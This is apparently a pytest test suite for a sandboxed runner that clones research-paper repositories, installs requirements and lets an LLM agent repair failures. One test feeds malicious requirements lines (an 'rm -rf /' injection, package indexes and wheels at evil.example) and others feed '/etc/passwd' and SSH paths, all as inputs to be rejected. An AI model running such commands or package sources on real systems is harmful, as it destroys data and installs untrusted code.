import json
import subprocess
from pathlib import Path
from unittest.mock import Mock

import pytest

from paperharness.aci.paper_aci import PaperACI
from paperharness.agent.fake import FakeLLM
from paperharness.contracts.run import (
    ExecResult,
    FinishRepairAction,
    RunPlan,
    RunRequest,
    RunState,
    SetEnvironmentAction,
)
from paperharness.harness import runner as runner_mod
from paperharness.harness.runner import INSTALL_COMMAND, HarnessRunner, git_clone
from paperharness.harness.store import RunStore
from paperharness.sandbox.base import SandboxUnavailableError
from paperharness.sandbox.fake import FakeSandboxSession


def make_runner(
    tmp_path, results=None, artifact_path=None, cloner=None, factory=None, llm=None,
    aci_factory=None,
):
    store = RunStore(tmp_path)

    def default_factory(request, run_dir):
        (run_dir / "workspace").mkdir(parents=True, exist_ok=True)
        (run_dir / "workspace" / "requirements.txt").write_text("", encoding="utf-8")
        return FakeSandboxSession(
            results, artifact_path=artifact_path, workspace=run_dir / "workspace"
        )

    def default_cloner(request, run_dir):
        return request.revision or "fake-commit"

    runner = HarnessRunner(
        store=store,
        llm=llm or FakeLLM(),
        sandbox_factory=factory or default_factory,
        cloner=cloner or default_cloner,
        aci_factory=aci_factory,
    )
    return runner, store


def test_target_destination_rejects_directory(tmp_path):
    (tmp_path / "check.py").mkdir()
    with pytest.raises(ValueError, match="unsafe target injection"):
        runner_mod._target_destination(tmp_path, "check.py")


def test_target_destination_rejects_symlink(tmp_path):
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    outside = tmp_path / "outside.py"
    outside.write_text("original", encoding="utf-8")
    try:
        (workspace / "check.py").symlink_to(outside)
    except OSError:
        pytest.skip("symlink creation unavailable")
    with pytest.raises(ValueError, match="unsafe target injection"):
        runner_mod._target_destination(workspace, "check.py")
    assert outside.read_text(encoding="utf-8") == "original"


def test_injected_requirements_start_on_new_line(tmp_path):
    from paperharness.targets.manifest import TargetManifest

    runner, store = make_runner(tmp_path / "runs")
    request = RunRequest(repo_url="https://github.com/a/b")
    run_id = store.create_run(request)
    workspace = store.run_dir(run_id) / "workspace"
    (workspace / "requirements.txt").write_text("numpy==1.26.4", encoding="utf-8")
    source = tmp_path / "target"
    source.mkdir()
    (source / "requirements.txt").write_text("scipy==1.12.0\n", encoding="utf-8")
    target = TargetManifest(
        id="example", repo_url=request.repo_url, revision="a" * 40,
        python_version="3.10", command=["python", "main.py"],
        failure_class="none", repairable=True, allowed_actions=[],
        expected_final="succeeded", source_dir=source,
    )
    runner._inject_target_files(run_id, workspace, target)
    assert (workspace / "requirements.txt").read_text(encoding="utf-8") == (
        "numpy==1.26.4\nscipy==1.12.0\n"
    )


def test_runner_success_verifies_artifact(tmp_path):
    runner, store = make_runner(tmp_path, artifact_path="out.txt")
    request = RunRequest(
        repo_url="https://github.com/a/b",
        command=["python", "main.py"],
        expected_artifact="out.txt",
    )
    run_id = store.create_run(request)
    result = runner.run(run_id, request)
    assert result.verified is True
    assert result.outcome == "succeeded"
    assert store.read_status(run_id)["state"] == RunState.SUCCEEDED.value


def test_runner_failure_is_not_verified(tmp_path):
    install_ok = ExecResult(
        exit_code=0,
        timed_out=False,
        duration_ms=5,
        stdout_path="logs/i.log",
        stderr_path="logs/i.err",
    )
    failing = ExecResult(
        exit_code=1,
        timed_out=False,
        duration_ms=5,
        stdout_path="logs/t.log",
        stderr_path="logs/t.err",
        stderr_tail="boom",
    )
    runner, store = make_runner(tmp_path, results=[install_ok, failing])
    request = RunRequest(repo_url="https://github.com/a/b", command=["python", "main.py"])
    run_id = store.create_run(request)
    result = runner.run(run_id, request)
    assert result.verified is False
    assert result.outcome == "failed"
    assert store.read_status(run_id)["state"] == RunState.FAILED.value


def test_clone_failure_marks_failed(tmp_path):
    def broken_cloner(request, run_dir):
        raise RuntimeError("git clone boom")

    runner, store = make_runner(tmp_path, cloner=broken_cloner)
    request = RunRequest(repo_url="https://github.com/a/b", command=["python", "main.py"])
    run_id = store.create_run(request)
    result = runner.run(run_id, request)
    assert result.outcome == "failed"
    assert result.failure_category == "clone_failed"
    assert store.read_status(run_id)["failure_category"] == "clone_failed"


def test_sandbox_start_is_visible_before_factory_returns(tmp_path):
    def factory(request, run_dir):
        events = store.read_events(run_dir.name)
        assert store.read_status(run_dir.name)["state"] == "planning"
        assert events[-1].kind == "sandbox_start"
        assert events[-1].data == {}
        assert all(event.kind != "sandbox_ready" for event in events)
        return FakeSandboxSession(workspace=run_dir / "workspace")

    runner, store = make_runner(tmp_path, factory=factory)
    request = RunRequest(repo_url="https://github.com/a/b", command=["python", "main.py"])
    run_id = store.create_run(request)
    runner.run(run_id, request)
    ready = next(event for event in store.read_events(run_id) if event.kind == "sandbox_ready")
    assert ready.state == RunState.PLANNING
    assert ready.data == {}  # 不虚构容器 ID 或健康遥测。


def test_sandbox_unavailable_marks_service_interrupted(tmp_path):
    from paperharness.sandbox.base import SandboxUnavailableError

    def dead_factory(request, run_dir):
        raise SandboxUnavailableError("no docker engine")

    runner, store = make_runner(tmp_path, factory=dead_factory)
    request = RunRequest(repo_url="https://github.com/a/b", command=["python", "main.py"])
    run_id = store.create_run(request)
    result = runner.run(run_id, request)
    assert result.outcome == "failed"
    assert result.failure_category == "service_interrupted"


@pytest.mark.parametrize(
    "bad_url",
    [
        "C:/Users/xxx/.ssh",
        "/etc/passwd",
        "file:///e:/java/LuminaLit",
        "ssh://git@h/o/r",
        "https://arxiv.org/html/2512.11143v1",  # 明知不是 Git 仓库的 host：防线御纵深
    ],
)
def test_git_clone_rejects_non_https_sources(tmp_path, bad_url):
    # model_construct 绕过 schema 校验，模拟直接喂 request.json 的路径
    request = RunRequest.model_construct(repo_url=bad_url)
    with pytest.raises(ValueError, match="invalid repo_url"):
        git_clone(request, tmp_path)
    # 没碰 workspace：不允许把本地目录搬进挂载区
    assert not (tmp_path / "workspace").exists()


def test_cleanup_failures_are_recorded(tmp_path):
    store = RunStore(tmp_path)

    def leaky_factory(request, run_dir):
        (run_dir / "workspace").mkdir(parents=True, exist_ok=True)
        (run_dir / "workspace" / "requirements.txt").write_text("", encoding="utf-8")
        session = FakeSandboxSession(
            artifact_path="out.txt", workspace=run_dir / "workspace"
        )
        session.cleanup_errors = ["container remove failed: boom", "network remove failed: boom"]
        return session

    runner = HarnessRunner(
        store=store,
        llm=FakeLLM(),
        sandbox_factory=leaky_factory,
        cloner=lambda request, run_dir: "fake-commit",
    )
    request = RunRequest(
        repo_url="https://github.com/a/b", command=["python", "main.py"],
        expected_artifact="out.txt",
    )
    run_id = store.create_run(request)
    result = runner.run(run_id, request)

    # 结果不受影响，但失败必须可见
    assert result.outcome == "succeeded"
    events = store.read_events(run_id)
    cleanup_events = [e for e in events if e.kind == "cleanup_failed"]
    assert len(cleanup_events) == 1
    assert cleanup_events[0].data["count"] == 2
    assert cleanup_events[0].state == RunState.SUCCEEDED
    environment = json.loads(store.read_text(run_id, "environment.json"))
    assert environment["cleanup_failures"] == 2
    assert "cleanup_failures=2" in store.read_text(run_id, "report.md")


def test_cleanup_success_leaves_no_trace(tmp_path):
    runner, store = make_runner(tmp_path, artifact_path="out.txt")
    request = RunRequest(
        repo_url="https://github.com/a/b", command=["python", "main.py"],
        expected_artifact="out.txt",
    )
    run_id = store.create_run(request)
    result = runner.run(run_id, request)
    assert result.outcome == "succeeded"
    assert all(e.kind != "cleanup_failed" for e in store.read_events(run_id))
    environment = json.loads(store.read_text(run_id, "environment.json"))
    assert "cleanup_failures" not in environment


def test_llm_unavailable_marks_failed(tmp_path):
    class DeadLLM(FakeLLM):
        def propose_run_plan(self, request):
            raise RuntimeError("llm gateway down")

    store = RunStore(tmp_path)

    def factory(request, run_dir):
        (run_dir / "workspace").mkdir(parents=True, exist_ok=True)
        return FakeSandboxSession(workspace=run_dir / "workspace")

    runner = HarnessRunner(
        store=store, llm=DeadLLM(), sandbox_factory=factory,
        cloner=lambda request, run_dir: "fake-commit",
    )
    request = RunRequest(repo_url="https://github.com/a/b", command=["python", "main.py"])
    run_id = store.create_run(request)
    result = runner.run(run_id, request)
    assert result.outcome == "failed"
    assert result.failure_category == "llm_unavailable"
    assert store.read_status(run_id)["failure_category"] == "llm_unavailable"


def test_cancel_during_run_marks_cancelled(tmp_path):
    store = RunStore(tmp_path)

    def cancelling_cloner(request, run_dir):
        # 在 clone 阶段请求取消：置事件 + 关闭 session
        assert runner.abort(run_dir.name) is True

    def factory(request, run_dir):
        (run_dir / "workspace").mkdir(parents=True, exist_ok=True)
        return FakeSandboxSession(
            artifact_path="out.txt", workspace=run_dir / "workspace"
        )

    runner = HarnessRunner(
        store=store, llm=FakeLLM(), sandbox_factory=factory,
        cloner=cancelling_cloner,
    )
    request = RunRequest(
        repo_url="https://github.com/a/b", command=["python", "main.py"],
        expected_artifact="out.txt",
    )
    run_id = store.create_run(request)
    result = runner.run(run_id, request)

    assert result.outcome == "cancelled"
    assert result.verified is False
    assert store.read_status(run_id)["state"] == RunState.CANCELLED.value
    assert store.read_result(run_id).outcome == "cancelled"
    final_events = [e for e in store.read_events(run_id) if e.kind == "final"]
    assert final_events and final_events[-1].state == RunState.CANCELLED


def test_abort_unknown_run_returns_false(tmp_path):
    store = RunStore(tmp_path)
    runner = HarnessRunner(
        store=store, llm=FakeLLM(),
        sandbox_factory=lambda request, run_dir: FakeSandboxSession(),
        cloner=lambda request, run_dir: "fake-commit",
    )
    assert runner.abort("never-started") is False


# ---------------------------------------------------------- requirements 校验


def make_runner_with_requirements(tmp_path, content, session_holder=None, session=None):
    """workspace 里塞指定内容的 requirements.txt，记录 session 供断言。"""
    store = RunStore(tmp_path)

    def factory(request, run_dir):
        (run_dir / "workspace").mkdir(parents=True, exist_ok=True)
        (run_dir / "workspace" / "requirements.txt").write_text(content, encoding="utf-8")
        sandbox = session or FakeSandboxSession(
            artifact_path="out.txt", workspace=run_dir / "workspace"
        )
        if session_holder is not None:
            session_holder.append(sandbox)
        return sandbox

    runner = HarnessRunner(
        store=store,
        llm=FakeLLM(),
        sandbox_factory=factory,
        cloner=lambda request, run_dir: "fake-commit",
    )
    return runner, store


@pytest.mark.parametrize(
    "content",
    [
        "numpy; rm -rf /\n",
        "--index-url http://evil.example/simple\nnumpy==1.0\n",
        "-e git+https://github.com/evil/x#egg=x\n",
        "pkg @ https://evil.example/x.whl\n",
        "numpy \\\n; rm -rf /\n",
    ],
)
def test_malicious_requirements_rejected_before_pip(tmp_path, content):
    # 拒绝时零副作用：一个 pip 命令都不许跑到
    holder: list = []
    runner, store = make_runner_with_requirements(tmp_path, content, session_holder=holder)
    request = RunRequest(repo_url="https://github.com/a/b", command=["python", "main.py"])
    run_id = store.create_run(request)

    result = runner.run(run_id, request)

    assert result.outcome == "failed"
    assert result.failure_category == "requirement_rejected"
    assert store.read_status(run_id)["state"] == RunState.FAILED.value
    assert holder[0].commands == []  # INSTALL_COMMAND 没执行
    rejected_events = [
        e for e in store.read_events(run_id) if e.kind == "install" and "rejected" in e.message
    ]
    assert rejected_events, "拒绝原因必须写进事件流"
    assert rejected_events[0].data["source"] == "requirements_file"


def test_requirements_with_comments_and_pins_passes(tmp_path):
    content = "# pinned\n\nnumpy==1.26.4  # security fix\nscipy>=1.11\n"
    holder: list = []
    runner, store = make_runner_with_requirements(tmp_path, content, session_holder=holder)
    request = RunRequest(
        repo_url="https://github.com/a/b", command=["python", "main.py"],
        expected_artifact="out.txt",
    )
    run_id = store.create_run(request)

    result = runner.run(run_id, request)

    assert result.outcome == "succeeded"
    assert INSTALL_COMMAND in holder[0].commands


def test_install_network_restored_off_when_execute_raises(tmp_path):
    from paperharness.sandbox.base import SandboxClosedError

    class InstallDiesSession(FakeSandboxSession):
        def execute(self, command, timeout_seconds):
            if command == INSTALL_COMMAND:
                raise SandboxClosedError("session died mid-install")
            return super().execute(command, timeout_seconds)

    holder: list = []
    runner, store = make_runner_with_requirements(
        tmp_path, "numpy==1.0\n", session_holder=holder, session=InstallDiesSession()
    )
    request = RunRequest(repo_url="https://github.com/a/b", command=["python", "main.py"])
    run_id = store.create_run(request)

    result = runner.run(run_id, request)

    # 原始异常不被 finally 盖掉：仍按超时口径收敛
    assert result.failure_category == "timeout"
    # install 抛异常后网络必须回到断网，不许留在开态
    assert holder[0].network_state is False


def test_repair_records_whitelisted_environment_value(tmp_path):
    runner, store = make_runner(
        tmp_path / "runs",
        results=[ExecResult(
            exit_code=0, timed_out=False, duration_ms=1,
            stdout_path="logs/t.out", stderr_path="logs/t.err",
        )],
        llm=FakeLLM(actions=[
            SetEnvironmentAction(action="set_environment", name="OMP_NUM_THREADS", value="1"),
            FinishRepairAction(action="finish_repair", summary="set thread count"),
        ]),
        aci_factory=PaperACI,
    )
    request = RunRequest(
        repo_url="https://github.com/a/b", command=["python", "main.py"], max_repairs=1,
    )
    run_id = store.create_run(request)
    workspace = store.run_dir(run_id) / "workspace"
    session = FakeSandboxSession(workspace=workspace)
    plan = RunPlan(
        resolved_revision="a" * 40, python_version="3.10", command=request.command, source="user",
    )
    failure = ExecResult(
        exit_code=1, timed_out=False, duration_ms=1,
        stdout_path="logs/f.out", stderr_path="logs/f.err", stderr_tail="boom",
    )

    healed = runner._self_heal(
        run_id, request, session, workspace, plan, failure, "test", [0],
        runner_mod.time.monotonic() + 60,
    )

    assert healed["verified"] is True
    event = next(event for event in store.read_events(run_id) if event.kind == "set_environment")
    assert event.data["env_name"] == "OMP_NUM_THREADS"
    assert event.data["env_value"] == "1"


def test_declared_install_keeps_nonzero_result_when_network_restore_fails(tmp_path):
    runner, store = make_runner(tmp_path)
    request = RunRequest(repo_url="https://github.com/a/b", command=["python", "main.py"])
    run_id = store.create_run(request)
    install = ExecResult(
        exit_code=1, timed_out=False, duration_ms=1,
        stdout_path="logs/i.out", stderr_path="logs/i.err", stderr_tail="install failed",
    )
    session = FakeSandboxSession()
    session.execute = Mock(return_value=install)
    session.set_network = Mock(side_effect=[None, SandboxUnavailableError("restore failed")])

    result = runner._run_declared_install(
        run_id, request, session, ["repair-dependency==1.0"],
        runner_mod.time.monotonic() + 60,
    )

    assert result is install
    assert session.set_network.call_args_list == [((True,),), ((False,),)]


def test_declared_install_preserves_original_execute_error(tmp_path):
    runner, store = make_runner(tmp_path)
    request = RunRequest(repo_url="https://github.com/a/b", command=["python", "main.py"])
    run_id = store.create_run(request)
    session = FakeSandboxSession()
    session.execute = Mock(side_effect=SandboxUnavailableError("original execute failure"))
    session.set_network = Mock(side_effect=[None, SandboxUnavailableError("restore failed")])

    with pytest.raises(SandboxUnavailableError, match="original execute failure"):
        runner._run_declared_install(
            run_id, request, session, ["repair-dependency==1.0"],
            runner_mod.time.monotonic() + 60,
        )

    assert session.set_network.call_args_list == [((True,),), ((False,),)]


def test_git_clone_uses_shallow_http11_env_and_mirror_fallback(tmp_path, monkeypatch):
    """git_clone 使用浅克隆 + HTTP/1.1 + 非交互环境变量，直连两次失败后切镜像并脱敏错误。"""
    monkeypatch.setenv("PAPERHARNESS_GIT_MIRROR", "https://ghfast.top/")
    calls: list[tuple[list[str], dict | None]] = []

    def fake_run(cmd, check=False, capture_output=False, text=False, timeout=None, env=None):
        calls.append((list(cmd), env))
        if "clone" in cmd:
            target_url = cmd[-2]
            if not target_url.startswith("https://ghfast.top/"):
                raise subprocess.CalledProcessError(
                    128,
                    cmd,
                    stderr=f"fatal: fetch-pack invalid index-pack in {tmp_path / 'workspace'}",
                )
            ws = Path(cmd[-1])
            ws.mkdir(parents=True, exist_ok=True)
            (ws / "main.py").write_text("print('ok')\n", encoding="utf-8")
            return subprocess.CompletedProcess(cmd, 0, stdout="", stderr="")
        if "rev-parse" in cmd:
            return subprocess.CompletedProcess(cmd, 0, stdout="a" * 40 + "\n", stderr="")
        return subprocess.CompletedProcess(cmd, 0, stdout="", stderr="")

    monkeypatch.setattr(runner_mod.subprocess, "run", fake_run)
    sha = git_clone(RunRequest(repo_url="https://github.com/owner/repo"), tmp_path)

    assert sha == "a" * 40
    clone_cmds = [c for c, _ in calls if "clone" in c]
    assert len(clone_cmds) == 3  # 直连两次 + 镜像兜底一次
    for cmd in clone_cmds:
        assert "--depth" in cmd
        assert "http.version=HTTP/1.1" in cmd
        assert "--no-recurse-submodules" in cmd
    assert clone_cmds[2][-2] == "https://ghfast.top/https://github.com/owner/repo"
    for _cmd, env in calls:
        assert env["GIT_TERMINAL_PROMPT"] == "0"
        assert env["GIT_LFS_SKIP_SMUDGE"] == "1"


def test_git_clone_sanitizes_stderr_and_rejects_oversized_repo(tmp_path, monkeypatch):
    """失败时提取 stderr 并替换宿主机路径；超过 200 MiB 时清理并直接失败。"""
    monkeypatch.delenv("PAPERHARNESS_GIT_MIRROR", raising=False)

    def fail_run(cmd, check=False, capture_output=False, text=False, timeout=None, env=None):
        raise subprocess.CalledProcessError(
            128,
            cmd,
            stderr=f"fatal: cannot write {tmp_path / 'workspace' / 'obj'}",
        )

    monkeypatch.setattr(runner_mod.subprocess, "run", fail_run)
    with pytest.raises(RuntimeError) as excinfo:
        git_clone(RunRequest(repo_url="https://github.com/owner/repo"), tmp_path)
    msg = str(excinfo.value)
    assert "git exited with 128" in msg
    assert "/workspace" in msg
    assert str(tmp_path) not in msg

    monkeypatch.setattr(runner_mod, "MAX_WORKSPACE_BYTES", 10)
    calls = 0

    def git_only_big_run(cmd, check=False, capture_output=False, text=False, timeout=None, env=None):
        if "clone" in cmd:
            ws = Path(cmd[-1])
            (ws / ".git").mkdir(parents=True, exist_ok=True)
            (ws / ".git" / "pack.bin").write_bytes(b"0" * 50)
            (ws / "main.py").write_bytes(b"ok")
        return subprocess.CompletedProcess(cmd, 0, stdout="a" * 40, stderr="")

    monkeypatch.setattr(runner_mod.subprocess, "run", git_only_big_run)
    assert git_clone(RunRequest(repo_url="https://github.com/owner/repo"), tmp_path) == "a" * 40

    def big_run(cmd, check=False, capture_output=False, text=False, timeout=None, env=None):
        nonlocal calls
        if "clone" in cmd:
            calls += 1
            ws = Path(cmd[-1])
            ws.mkdir(parents=True, exist_ok=True)
            (ws / "big.bin").write_bytes(b"0" * 50)
        return subprocess.CompletedProcess(cmd, 0, stdout="a" * 40, stderr="")

    monkeypatch.setattr(runner_mod.subprocess, "run", big_run)
    with pytest.raises(RuntimeError, match="200 MiB"):
        git_clone(RunRequest(repo_url="https://github.com/owner/repo"), tmp_path)
    assert calls == 1  # 体积超限不重试


@pytest.mark.parametrize("bad_artifact", ["../request.json", "/etc/passwd", "C:\\Windows\\win.ini"])
def test_invalid_expected_artifact_path_is_rejected(tmp_path, bad_artifact):
    runner, store = make_runner(tmp_path, artifact_path=None)
    request = RunRequest(
        repo_url="https://github.com/a/b",
        command=["python", "main.py"],
        expected_artifact=bad_artifact,
    )
    run_id = store.create_run(request)
    result = runner.run(run_id, request)

    assert result.verified is False
    assert result.outcome == "failed"
    assert result.failure_category == "invalid_expected_artifact"


def test_empty_command_maps_to_missing_run_command(tmp_path):
    from paperharness.contracts.run import RunPlan

    class EmptyCommandLLM(FakeLLM):
        def propose_run_plan(self, request):
            return RunPlan(
                resolved_revision="f" * 40,
                python_version="3.10",
                command=[],
                source="repository_analysis",
            )

    store = RunStore(tmp_path)
    factory_called = False

    def factory(request, run_dir):
        nonlocal factory_called
        factory_called = True
        return FakeSandboxSession(workspace=run_dir / "workspace")

    runner = HarnessRunner(
        store=store,
        llm=EmptyCommandLLM(),
        sandbox_factory=factory,
        cloner=lambda req, run_dir: "f" * 40,
    )
    request = RunRequest(repo_url="https://github.com/a/b")
    run_id = store.create_run(request)
    result = runner.run(run_id, request)

    assert result.outcome == "failed"
    assert result.failure_category == "missing_run_command"
    assert factory_called is False


def test_clone_failure_does_not_create_sandbox(tmp_path):
    factory_called = False

    def recording_factory(request, run_dir):
        nonlocal factory_called
        factory_called = True
        return FakeSandboxSession(workspace=run_dir / "workspace")

    def broken_cloner(request, run_dir):
        raise RuntimeError("clone boom")

    runner, store = make_runner(tmp_path, cloner=broken_cloner, factory=recording_factory)
    request = RunRequest(repo_url="https://github.com/a/b", command=["python", "main.py"])
    run_id = store.create_run(request)
    result = runner.run(run_id, request)

    assert result.failure_category == "clone_failed"
    assert factory_called is False
